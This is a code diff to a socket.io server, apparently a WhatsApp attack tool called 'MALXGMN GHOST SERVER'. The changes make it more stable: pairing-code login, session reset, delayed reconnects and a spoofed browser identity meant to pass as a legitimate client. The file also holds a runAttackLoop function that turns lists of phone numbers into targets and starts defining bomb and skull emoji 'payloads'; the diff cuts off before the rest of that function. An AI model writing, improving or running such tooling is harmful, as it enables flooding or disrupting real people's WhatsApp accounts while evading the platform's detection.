@@ -1,5 +1,5 @@
 // stateless_server.js
-// VERSION: GHOST-V3-PAIRING-CODE
+// VERSION: GHOST-V4-STABILITY-FIX
 // TIMESTAMP: ${new Date().toISOString()}
 
 import { Server } from "npm:socket.io";
@@ -19,7 +19,7 @@ import pino from 'npm:pino';
 
 const httpServer = createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('MALXGMN GHOST SERVER (SOCKET.IO) IS RUNNING');
+    res.end('MALXGMN GHOST SERVER V4 (STABLE) IS RUNNING');
 });
 
 const io = new Server(httpServer, {
@@ -29,9 +29,12 @@ const io = new Server(httpServer, {
     }
 });
 
+// GLOBAL VARS
 let activeSock = null;
 let isAttacking = false;
+let socketInitializing = false;
 
+// AUTH HELPER (Memory Only)
 const useSocketAuthState = async (socket, initialData) => {
     const creds = initialData?.creds 
         ? JSON.parse(JSON.stringify(initialData.creds), BufferJSON.reviver) 
@@ -80,9 +83,24 @@ const useSocketAuthState = async (socket, initialData) => {
 };
 
 io.on("connection", (socket) => {
-    console.log(`[+] New Client Connected: ${socket.id}`);
+    console.log(`[+] Client Connected: ${socket.id}`);
+
+    // RESET COMMAND
+    socket.on("force_reset", async () => {
+        if (activeSock) {
+            try { activeSock.end(undefined); } catch {}
+            activeSock = null;
+        }
+        socketInitializing = false;
+        socket.emit("status", "Server Reset. Re-initializing...");
+        // Client should emit init_session again
+    });
 
     socket.on("init_session", async (rawSessionJson) => {
+        // Prevent double init
+        if (socketInitializing) return;
+        socketInitializing = true;
+
         try {
             if (activeSock) {
                 try { activeSock.end(undefined); } catch {}
@@ -93,30 +111,36 @@ io.on("connection", (socket) => {
             if (rawSessionJson) {
                 try {
                     initialData = JSON.parse(rawSessionJson, BufferJSON.reviver);
-                    console.log("[✔] Session loaded");
+                    console.log("[✔] Session loaded from client");
                 } catch (e) {
-                    console.log("[-] Invalid JSON");
+                    console.log("[-] Invalid JSON session");
                 }
             } 
             await startSock(socket, initialData);
 
         } catch (e) {
             console.error("Init Error:", e);
+            socket.emit("error", "Init Failed: " + e.message);
+            socketInitializing = false;
         }
     });
 
-    // --- NEW: PAIRING CODE HANDLER ---
     socket.on("use_pairing_code", async (phoneNumber) => {
         if (!activeSock) {
-            return socket.emit("error", "Socket not initialized. Connect first.");
+            return socket.emit("error", "WA Engine not ready. Wait 5 seconds.");
         }
         try {
             console.log(`[*] Requesting pairing code for ${phoneNumber}`);
+            
+            // Wait a bit to ensure socket is stable
+            await delay(2000); 
+
             const code = await activeSock.requestPairingCode(phoneNumber);
+            console.log(`[+] Code Generated: ${code}`);
             socket.emit("pairing_code", code);
         } catch (e) {
             console.error("Pairing Error:", e);
-            socket.emit("error", "Pairing Failed: " + e.message);
+            socket.emit("error", "Pairing Failed. Restart App. " + e.message);
         }
     });
 
@@ -143,30 +167,40 @@ async function startSock(socket, initialData) {
             creds: state.creds,
             keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
         },
-        // Browser config to look like a legit desktop client
-        browser: ["Chrome (Linux)", "", ""], 
+        // Ubuntu/Chrome is stable for Pairing Code
+        browser: ["Ubuntu", "Chrome", "20.0.04"], 
         generateHighQualityLinkPreview: true,
+        // Increase timeout for Deno environment
+        connectTimeoutMs: 60000, 
     });
 
-    // IMPORTANT: Assign activeSock IMMEDIATELY so pairing code works
     activeSock = sock;
+    socketInitializing = false;
 
     sock.ev.on('connection.update', (update) => {
         const { connection, lastDisconnect, qr } = update;
 
-        if (qr) socket.emit('qr', qr);
+        if (qr) {
+            console.log("[QR] QR Generated");
+            socket.emit('qr', qr);
+        }
 
         if (connection === 'close') {
             const shouldReconnect = (lastDisconnect.error instanceof Boom)
                 ? lastDisconnect.error.output?.statusCode !== DisconnectReason.loggedOut
                 : true;
             
+            console.log(`[!] Closed. Reconnect: ${shouldReconnect}`);
+
             if (shouldReconnect) {
-                startSock(socket, initialData);
+                // Delay reconnection slightly to avoid spam loop
+                setTimeout(() => startSock(socket, initialData), 3000);
             } else {
                 socket.emit('logged_out', 'Session Invalidated');
+                activeSock = null;
             }
         } else if (connection === 'open') {
+            console.log("[+] Connected");
             socket.emit('ready', 'WhatsApp Connected');
         }
     });
@@ -178,7 +212,7 @@ async function runAttackLoop(socket, rawTargets) {
     isAttacking = true;
     const targetJids = rawTargets.map(t => t.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
     
-    // --- PAYLOADS (UNICODE SAFE) ---
+    // PAYLOADS (Unicode Safe)
     const _f = "\\uD83D\\uDD25"; 
     const _s = "\\u2620\\uFE0F"; 
     const _b = "\\uD83D\\uDCA3"; 
